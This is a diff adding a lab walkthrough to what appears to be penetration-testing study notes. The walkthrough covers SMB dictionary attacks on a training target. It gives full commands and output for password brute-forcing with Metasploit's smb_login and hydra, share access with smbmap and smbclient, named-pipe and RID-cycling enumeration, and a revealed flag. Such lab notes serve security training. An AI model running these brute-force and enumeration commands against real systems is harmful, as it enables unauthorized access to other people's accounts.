@@ -1397,3 +1397,224 @@ root@attackdefense:~# cat flag
 
 ------
 
+## Lab 6
+
+>  🔬 [Samba Recon: Dictionary Attack(https://attackdefense.pentesteracademy.com/challengedetails?cid=556)
+>
+>  - Target IP: `192.174.58.3`
+>  - Linux SMB detailed enumeration using `word lists`
+
+`Word lists` are lists of already known and used passwords, some of them leaked from breached websites or other services. Those passwords can be used as part of the attack via brute force tools.
+
+In Kali Linux [wordlists](https://www.kali.org/tools/wordlists/) can be found inside `/usr/share/wordlists` directory.
+
+```bash
+gzip -d /usr/share/wordlists/rockyou.txt.gz
+# Unzip rockyou.txt list
+```
+
+```bash
+ip -br -c a
+```
+
+```bash
+eth0@if108486    UP             10.1.0.4/16 
+eth1@if108489    UP             192.174.58.2/24
+```
+
+- Target IP is `192.174.58.3`
+
+```bash
+nmap 192.174.58.3
+```
+
+```bash
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+```
+
+- Use [`smb_login`](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_login) metasploit module to bruteforce *jane*'s password
+
+```bash
+msfconsole
+```
+
+```bash
+use auxiliary/scanner/smb/smb_login 
+set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
+set SMBUser jane
+set RHOSTS 192.174.58.3
+exploit
+```
+
+```bash
+[*] 192.174.58.3:445      - 192.174.58.3:445 - Starting SMB login bruteforce
+[-] 192.174.58.3:445      - 192.174.58.3:445 - Failed: '.\jane:admin',
+[!] 192.174.58.3:445      - No active DB -- Credential data will not be saved!
+[-] 192.174.58.3:445      - 192.174.58.3:445 - Failed: '.\jane:123456',
+[-] 192.174.58.3:445      - 192.174.58.3:445 - Failed: '.\jane:12345',
+[-] 192.174.58.3:445      - 192.174.58.3:445 - Failed: '.\jane:123456789',
+[-] 192.174.58.3:445      - 192.174.58.3:445 - Failed: '.\jane:password',
+[-] 192.174.58.3:445      - 192.174.58.3:445 - Failed: '.\jane:iloveyou',
+[-] 192.174.58.3:445      - 192.174.58.3:445 - Failed: '.\jane:princess',
+[-] 192.174.58.3:445      - 192.174.58.3:445 - Failed: '.\jane:1234567',
+[-] 192.174.58.3:445      - 192.174.58.3:445 - Failed: '.\jane:12345678',
+[+] 192.174.58.3:445      - 192.174.58.3:445 - Success: '.\jane:abc123'
+[*] 192.174.58.3:445      - Scanned 1 of 1 hosts (100% complete)
+```
+
+![metasploit smb_login](.gitbook/assets/image-20230215101433193.png)
+
+> 📌 Jane's password is `abc123`
+
+### hydra
+
+- Use [`hydra` tool](https://www.kali.org/tools/hydra/) to find *admin* user password
+
+> [**`hydra`**](https://github.com/vanhauser-thc/thc-hydra) - tool to guess/crack valid login/password pairs
+
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.174.58.3 smb
+```
+
+```bash
+[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
+[DATA] attacking smb://192.174.58.3:445/
+[445][smb] host: 192.174.58.3   login: admin   password: password1
+1 of 1 target successfully completed, 1 valid password found
+```
+
+![hydra](.gitbook/assets/image-20230215102856704.png)
+
+> 📌 admin's password is `password1`
+
+- Find `smb shares` using found credentials
+
+```bash
+smbmap -u admin -p password1 -H 192.174.58.3
+```
+
+```bash
+[+] Finding open SMB ports....
+[+] User SMB session establishd on 192.174.58.3...
+[+] IP: 192.174.58.3:445        Name: target-1                                          
+   Disk     Permissions
+   ----     -----------
+   shawn    READ, WRITE
+   nancy    READ ONLY
+   admin    READ, WRITE
+   IPC$     NO ACCESS
+```
+
+> 📌 *Read-only* share is `nancy`
+
+```bash
+smbclient -L 192.28.157.3 -U jane
+# Use "abc123" password
+```
+
+![](.gitbook/assets/image-20230215103352757.png)
+
+```bash
+smbclient //192.174.58.3/jane -U jane
+
+smb: \> ls
+  .      D  0  Tue Nov 27 19:25:12 2018
+  ..     D  0  Tue Nov 27 19:25:12 2018
+  admin  D  0  Tue Nov 27 19:25:12 2018
+  logs   D  0  Tue Nov 27 19:25:12 2018
+  flag   D  0  Tue Nov 27 19:25:12 2018
+  1981084628 blocks of size 1024. 48016456 blocks available
+smb: \> pwd
+Current directory is \\192.174.58.3\jane\
+```
+
+![](.gitbook/assets/image-20230215103619604.png)
+
+> 📌 *jane*'s share is not browsable but it exists.
+
+```bash
+smbclient //192.174.58.3/admin -U admin
+# Use "password1" password
+```
+
+```bash
+smb: \> ls
+smb: \> cd hidden
+smb: \hidden\> ls
+smb: \hidden\> get flag.tar.gz 
+smb: \hidden\> exit
+
+root@attackdefense:~# tar -xf flag.tar.gz 
+root@attackdefense:~# cat flag
+```
+
+```bash
+smb: \> cd secret
+smb: \secret\> ls
+  .     D   0  Tue Nov 27 13:36:13 2018
+  ..    D   0  Tue Feb 14 21:58:47 2023
+  flag  N  33  Tue Nov 27 13:36:13 2018
+  1981084628 blocks of size 1024. 39614508 blocks available
+  
+smb: \secret\> get flag
+getting file \secret\flag of size 33 as flag (32.2 KiloBytes/sec) (average 32.2 KiloBytes/sec)
+smb: \secret\> exit
+
+root@attackdefense:~# cat flag 
+```
+
+<details>
+<summary>Reveal Flag:  🚩</summary>
+
+`2727069bc058053bd561ce372721c92e`
+
+</details>
+
+- A [named pipe](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wpo/4de75e21-36fd-440a-859b-75accc74487c) is a logical connection between a client and server involved in a SMB connection, similar to an open TCP port.
+- Use [`pipe_auditor`](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/pipe_auditor) metasploit module to enumerate the named pipes
+
+```bash
+msfconsole
+```
+
+```bash
+use auxiliary/scanner/smb/pipe_auditor 
+set SMBUser admin
+set SMBPass password1
+set RHOSTS 192.174.58.3
+exploit
+
+[+] 192.174.58.3:139      - Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \ntsvcs, \srvsvc, \wkssvc
+[*] 192.174.58.3:         - Scanned 1 of 1 hosts (100% complete)
+```
+
+![metasploit pipe_auditor](.gitbook/assets/image-20230215105049826.png)
+
+> 📌 Named pipes available over SMB are `netlogon`, `lsarpc`, `samr`, `eventlog`, `InitShutdown`, `ntsvcs`, `srvsvc`, `wkssvc`
+
+- List users' SID by performing RID cycling.
+
+```bash
+enum4linux -r -u "admin" -p "password1" 192.174.58.3
+```
+
+```bash
+[+] Enumerating users using SID S-1-22-1 and logon username 'admin', password 'password1'
+S-1-22-1-1000 Unix User\shawn (Local User)
+S-1-22-1-1001 Unix User\jane (Local User)
+S-1-22-1-1002 Unix User\nancy (Local User)
+S-1-22-1-1003 Unix User\admin (Local User)
+enum4linux complete on Wed Feb 15 09:55:02 2023
+```
+
+> 📌 shawn SID is `S-1-22-1-1000`
+>
+> 📌 jane SID is `S-1-22-1-1001`
+>
+> 📌 nancy SID is `S-1-22-1-1002`
+>
+> 📌 admin SID is `S-1-22-1-1003`
+
+------
+
